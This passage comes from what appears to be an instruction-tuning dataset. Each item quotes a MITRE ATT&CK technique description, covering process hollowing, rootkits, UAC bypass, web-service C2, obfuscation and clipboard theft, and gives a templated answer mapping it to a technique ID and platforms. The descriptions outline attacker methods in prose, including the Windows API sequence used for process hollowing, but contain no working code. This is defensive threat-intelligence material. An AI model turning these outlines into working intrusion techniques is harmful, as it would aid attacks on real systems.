      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection: Process Hollowing (T1055.012);\nTechnique Process Injection: Process Hollowing (T1055.012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
      "answer": "The provided description is related to MITRE technique Process Injection: Process Hollowing (T1055.012);\nTechnique Process Injection: Process Hollowing (T1055.012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "answer": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Rootkit (T1014);\nTechnique Rootkit (T1014) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.",
      "answer": "The provided description is related to MITRE technique Rootkit (T1014);\nTechnique Rootkit (T1014) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Connections Discovery (T1049);\nTechnique System Network Connections Discovery (T1049) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "answer": "The provided description is related to MITRE technique System Network Connections Discovery (T1049);\nTechnique System Network Connections Discovery (T1049) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Gather Victim Org Information: Business Relationships (T1591.002);\nTechnique Gather Victim Org Information: Business Relationships (T1591.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).",
      "answer": "The provided description is related to MITRE technique Gather Victim Org Information: Business Relationships (T1591.002);\nTechnique Gather Victim Org Information: Business Relationships (T1591.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "context": "",
    "output": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "answer": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).?",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "answer": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.",
      "answer": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
    "context": "",
    "output": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "answer": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
